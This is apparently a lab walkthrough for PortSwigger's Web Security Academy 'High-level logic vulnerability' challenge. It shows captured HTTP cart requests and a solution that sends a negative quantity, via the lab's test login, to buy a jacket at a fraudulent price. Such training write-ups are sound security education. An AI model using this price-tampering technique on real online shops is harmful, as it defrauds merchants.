# [Lab 2: High-level logic vulnerability](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)

---

## Description

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

Log in to the web application with the credentials `wiener:peter` and navigate to the "Lightweight l33t leather jacket" item. Add one to the cart, generating the following request.

```http
POST /cart HTTP/1.1
Host: ace01fd21e8279a6807d9a1300cc0098.web-security-academy.net
Cookie: session=zgpO45mtkqXozTGalnUg1TqsSBBTjtVq
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: https://ace01fd21e8279a6807d9a1300cc0098.web-security-academy.net
Dnt: 1
Referer: https://ace01fd21e8279a6807d9a1300cc0098.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&redir=CART&quantity=1
```

Walking through the rest of the purchasing workflow seems to indicate everything else is normal. Navigate to the cart and remove the jacket, generating the following request.

```http
POST /cart HTTP/1.1
Host: ace01fd21e8279a6807d9a1300cc0098.web-security-academy.net
Cookie: session=zgpO45mtkqXozTGalnUg1TqsSBBTjtVq
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: https://ace01fd21e8279a6807d9a1300cc0098.web-security-academy.net
Dnt: 1
Referer: https://ace01fd21e8279a6807d9a1300cc0098.web-security-academy.net/cart?err=INSUFFICIENT_FUNDS
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&quantity=-1&redir=CART
```

The application removes items from the cart by having the user submit the `productId` and a negative `quantity`.

There are no longer any items in the cart. What happens if this request is resent? How does the application respond to trying to add an item of `quantity=-1` to the cart? Resend the request.

The response is a 302 redirect to `/cart` with no indication of an error. Follow the redirect.

![](images/Pasted%20image%2020210820212938.png)

This indeed added the jacket to the cart with a quantity of -1. The total value to be withdrawn from the store credit is -$1337.00, which would be a nice deposit. Place the order.

Error. `Cart total prices cannot be less than zero`.

![](images/Pasted%20image%2020210820213159.png)

No problem. Add other items to the cart to cause the total price to be between $0 and $100, like 14 units of "High-End Gift Wrapping."

![](images/Pasted%20image%2020210820213501.png)

How will the application respond when ordering a negative quantity of leather jackets, though? Since that is the target item, flip the quantities to 1 "Lightweight l33t leather jacket" and -13 units of "High-End Gift Wrapping."

![](images/Pasted%20image%2020210820213803.png)

The final total is $44.67. Place the order and complete the challenge.

![](images/Pasted%20image%2020210820213944.png)




